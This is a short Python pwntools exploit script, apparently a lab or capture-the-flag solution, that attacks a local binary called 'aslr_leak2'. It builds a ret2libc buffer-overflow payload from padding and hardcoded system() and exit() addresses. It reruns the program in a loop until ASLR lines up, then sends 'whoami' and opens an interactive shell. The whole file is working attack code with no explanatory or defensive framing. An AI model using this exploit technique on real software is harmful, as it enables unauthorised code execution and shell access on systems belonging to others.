import struct
#from subprocess import call
from pwn import *
#libc_base_addr = 0xb75e4000
#system_off = 0x00040190
#exit_off = 0x000331e0
tru = 0xcfb0
cong = 0x120894
system_adrr = 0xb75c8190
exit_addrr = system_adrr - tru
sys_arg = system_adrr + cong
def conv(num):
    return struct.pack("I",num)

payload = "A"*28
payload += conv(system_adrr)
payload += conv(exit_addrr)
payload += conv(sys_arg)
print "Start exploit"
i = 0
while True:
    print "Number of tries: %d" % i
    i +=1
    p = process(["./aslr_leak2", "AAA"])
    #p.sendline(payload)
    
    b = p.recv()
    print b
    p.sendline(payload)
    p.sendline("whoami")
    try:
        ret = p.recv(200)
        break
    except EOFError:
        continue
print ret
p.interactive()
    
